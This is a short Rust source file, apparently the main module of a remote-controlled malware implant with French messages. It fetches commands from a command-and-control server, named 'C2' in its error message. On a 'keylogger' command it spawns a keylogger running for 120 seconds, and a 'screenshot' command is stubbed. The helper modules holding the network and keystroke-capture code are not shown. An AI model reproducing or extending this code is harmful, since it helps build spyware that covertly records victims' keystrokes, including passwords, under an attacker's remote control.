mod connexion;
mod input;

#[tokio::main]
async fn main() {
    match connexion::get_directives().await {
        Ok(commands) => {
            println!("Commands received: {:?}", commands);
            for command in commands {
                match command.as_str() {
                    "keylogger" => {
                        tokio::spawn(async {
                            input::start_keylogger(120).await;
                        });
                    }
                    "screenshot" => println!("Screenshot command reçue"),
                    _ => println!("Commande inconnue: {}", command),
                }
            }
        }
        Err(e) => eprintln!("Erreur avec la connexion au C2: {}", e),
    }
}
